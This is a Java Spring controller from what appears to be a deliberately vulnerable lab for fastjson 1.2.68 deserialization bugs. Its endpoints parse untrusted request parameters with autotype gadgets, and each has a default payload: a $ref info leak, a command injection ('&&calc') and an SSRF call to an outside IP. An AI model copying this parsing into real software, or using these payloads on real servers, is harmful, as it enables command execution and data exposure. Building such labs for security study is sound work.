package com.snowsec0.fastjsonvul.fastjson68;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import com.snowsec0.fastjsonvul.fastjson68.DatasourceException;
import com.snowsec0.fastjsonvul.fastjson68.PingException;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.ModelAndView;
import org.openqa.selenium.WebDriverException;
import java.util.ArrayList;
import java.util.List;
@RestController
public class fastjson68 {
 
	public static List<Comment>  comments = new ArrayList(){
        {
            Comment comment = new Comment();
            comment.setName("Tom");
            comment.setContent("Hello World.");
            comment.setEmail("tom@gmail.com");
            add(comment);
        }
    };
    
    
 @RequestMapping("/webdriverexception")
 public String fastfson68(@RequestParam(value="comment",required=false)String comment) {
	 if(comment ==null || comment.length() == 0) {
		  comment = "{\"content\":{\"$ref\":\"$x.systemInformation\"}, \"x\": {\"@type\":\"org.openqa.selenium.WebDriverException\",\"@type\":\"java.lang.Exception\"}}";
	 }
  JSONObject jsonObject = JSON.parseObject(comment);
  System.out.printf(jsonObject.getString("content"));
  return jsonObject.getString("content");
 }
 
 @RequestMapping("/pingexception")
 public String pingexception(@RequestParam(value="cmd",required=false)String cmd)
 {
	 if(cmd ==null || cmd.length() == 0) {
		 cmd = "{\"@type\":\"java.lang.Exception\", \"@type\":\"com.snowsec0.fastjsonvul.fastjson68.PingException\",\"domain\":\"b1ue.cn&&calc\"}";
	 }
		 JSONObject jsonObject = JSON.parseObject(cmd);
  return "ping exception";
 }
 @RequestMapping("/datasourceexception")
 public String datasource(@RequestParam(value="url",required=false)String url)
 {
	 if(url ==null || url.length() == 0) {
		  url = "{\"@type\":\"java.lang.Exception\",\"@type\":\"com.snowsec0.fastjsonvul.fastjson68.DatasourceException\", \"dataSource\": {\"@type\": \"java.net.URL\", \"val\": \"http://47.104.218.243/ssrf/ssrf.php?rand=fastjson68\"}}"; 
	 }
	 JSONObject jsonObject = JSON.parseObject(url);
  return "ping exception";
 }
 

  @RequestMapping("/")
    public ModelAndView index(){
        ModelAndView modelAndView = new ModelAndView();
        modelAndView.setViewName("index.html");
        modelAndView.addObject("comments",comments);
        return modelAndView;
    }

    @RequestMapping("addComment")
    @ResponseBody
    public String addComment(@RequestBody String comment){
        
        JSONObject jsonObject = JSON.parseObject(comment);
        Comment temp = new Comment();
        temp.setName(jsonObject.getString("name"));
        temp.setEmail(jsonObject.getString("email"));
        temp.setContent(jsonObject.getString("content"));
        comments.add(temp);
        return "1";
    }
 
}